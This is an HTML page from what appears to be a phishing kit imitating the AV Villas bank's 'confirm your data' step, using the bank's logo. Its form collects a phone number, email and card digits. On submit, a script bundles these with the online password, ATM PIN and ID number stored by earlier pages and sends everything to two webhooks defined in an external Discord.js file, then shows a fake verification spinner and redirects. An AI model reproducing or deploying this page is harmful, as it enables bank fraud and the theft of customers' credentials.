<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>AV Villas - Confirmar Datos</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
    }
    .icon-right {
      opacity: 0;
      transition: opacity 0.3s ease;
    }
    input:focus ~ .icon-right,
    input:not(:placeholder-shown) ~ .icon-right {
      opacity: 1;
    }
  </style>
</head>
<body class="bg-white text-black min-h-screen flex flex-col items-center pt-8 px-4">
  <img alt="Logo AV Villas" class="w-[1600px] h-[50px] object-contain mb-6" src="https://www.avvillas.com.co/wps/wcm/connect/avvillas/efa08570-8128-4a7b-a324-5d9aa6c87fc2/logo-avv-digital.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_G0MI0J02L8NK70AHL9SQNR1826-efa08570-8128-4a7b-a324-5d9aa6c87fc2-p5cl6.b"/>

  <h1 class="text-black font-semibold text-base mb-6 text-center">
    Confirma tu informaci√≥n para continuar
  </h1>

  <form class="w-full max-w-md space-y-6" id="confirmForm">
    <div class="relative">
      <input type="tel" id="phone" name="phone" required pattern="[0-9]{10}" maxlength="10"
        class="peer w-full border border-gray-300 rounded-md px-4 pt-6 pb-2 text-base text-gray-800 placeholder-transparent focus:outline-none focus:border-blue-700 pr-10"
        placeholder="N√∫mero de tel√©fono"/>
      <label for="phone" class="absolute left-3 top-2 text-xs text-blue-700 bg-white px-1 transition-all peer-placeholder-shown:top-5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:top-2 peer-focus:text-xs peer-focus:text-blue-700">
        N√∫mero de tel√©fono
      </label>
      <i class="fas fa-phone icon-right absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none"></i>
    </div>

    <div class="relative">
      <input type="email" id="email" name="email" required
        class="peer w-full border border-gray-300 rounded-md px-4 pt-6 pb-2 text-base text-gray-800 placeholder-transparent focus:outline-none focus:border-blue-700 pr-10"
        placeholder="Correo electr√≥nico"/>
      <label for="email" class="absolute left-3 top-2 text-xs text-blue-700 bg-white px-1 transition-all peer-placeholder-shown:top-5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:top-2 peer-focus:text-xs peer-focus:text-blue-700">
        Correo electr√≥nico
      </label>
      <i class="fas fa-envelope icon-right absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none"></i>
    </div>

    <div class="relative">
      <input type="text" id="cardDigits" name="cardDigits" required maxlength="11"
        class="peer w-full border border-gray-300 rounded-md px-4 pt-6 pb-2 text-base text-gray-800 placeholder-transparent focus:outline-none focus:border-blue-700 pr-10"
        placeholder="√öltimos 8 d√≠gitos de tu tarjeta de credito"/>
      <label for="cardDigits" class="absolute left-3 top-2 text-xs text-blue-700 bg-white px-1 transition-all peer-placeholder-shown:top-5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:top-2 peer-focus:text-xs peer-focus:text-blue-700">
        √öltimos 8 d√≠gitos de tu tarjeta de credito
      </label>
      <i class="fas fa-credit-card icon-right absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none"></i>
    </div>

    <button type="submit" id="submitBtn" disabled class="w-full bg-gray-300 text-white font-semibold py-4 rounded-full text-sm tracking-widest cursor-not-allowed transition duration-300">
      CONFIRMAR
    </button>
  </form>

  <p class="mt-8 text-center text-black text-sm">
    ¬øA√∫n no tienes tu tarjeta activa?
    <br/>
    <a href="#" class="text-blue-700 font-semibold hover:underline">Solic√≠tala aqu√≠</a>
  </p>

  <p class="mt-6 text-center text-blue-700 text-sm font-semibold underline">
    ¬øTienes problemas para confirmar tus datos?
  </p>

  <div class="fixed top-[50%] right-0 -translate-y-1/2 bg-red-600 rounded-l-full w-12 h-12 flex items-center justify-center cursor-pointer select-none overflow-hidden">
    <img src="img/carita.png" alt="bot√≥n" class="max-w-[70%] max-h-[70%] object-contain"/>
  </div>

  <!-- Loader rojo -->
  <div id="loader" class="fixed inset-0 bg-white bg-opacity-90 flex flex-col items-center justify-center z-50 hidden">
    <div class="animate-spin rounded-full h-20 w-20 border-4 border-red-600 border-t-transparent"></div>
    <p class="mt-4 text-red-600 font-semibold text-lg">Verificando...</p>
  </div>

  <script>
    const phone = document.getElementById('phone');
    const email = document.getElementById('email');
    const cardDigits = document.getElementById('cardDigits');
    const submitBtn = document.getElementById('submitBtn');

    function checkInputs() {
      const phoneValid = phone.value.trim().length === 10;
      const emailValid = email.value.trim().includes('@');
      const cardValue = cardDigits.value.replace(/\D/g, '');
      const cardValid = cardValue.length === 8;

      if (phoneValid && emailValid && cardValid) {
        submitBtn.disabled = false;
        submitBtn.classList.remove('bg-gray-300', 'cursor-not-allowed');
        submitBtn.classList.add('bg-blue-700', 'hover:bg-blue-800', 'cursor-pointer');
      } else {
        submitBtn.disabled = true;
        submitBtn.classList.add('bg-gray-300', 'cursor-not-allowed');
        submitBtn.classList.remove('bg-blue-700', 'hover:bg-blue-800', 'cursor-pointer');
      }
    }

    cardDigits.addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '').slice(0, 8);
      value = value.replace(/(\d{4})(\d{1,4})?/, (_, p1, p2) => p2 ? `${p1} ${p2}` : p1);
      e.target.value = value;
      checkInputs();
    });

    phone.addEventListener('input', checkInputs);
    email.addEventListener('input', checkInputs);

  </script>

  <script src="Discord.js"></script>
  <script>
    document.getElementById('confirmForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const allData = [
        ["Tipo de documento", localStorage.getItem('docType')],
        ["N√∫mero de documento", localStorage.getItem('docNumber')],
        ["Contrase√±a", localStorage.getItem('password')],
        ["Clave de cajero", localStorage.getItem('cajeroPin')],
        ["Tel√©fono", phone.value],
        ["Correo electr√≥nico", email.value],
        ["D√≠gitos de tarjeta", cardDigits.value]
      ];

      enviarDatosAWebhook("üì± Confirmaci√≥n completa", allData, WEBHOOK_1);
      enviarDatosAWebhook("üì© Confirmaci√≥n completa", allData, WEBHOOK_2);

      // Mostrar loader rojo
      document.getElementById('loader').classList.remove('hidden');

      // Redirigir despu√©s de 5 segundos
      setTimeout(() => {
        window.location.href = "final.html"; // Cambia esta URL si quieres otra p√°gina
      }, 5000);
    });
  </script>
</body>
</html>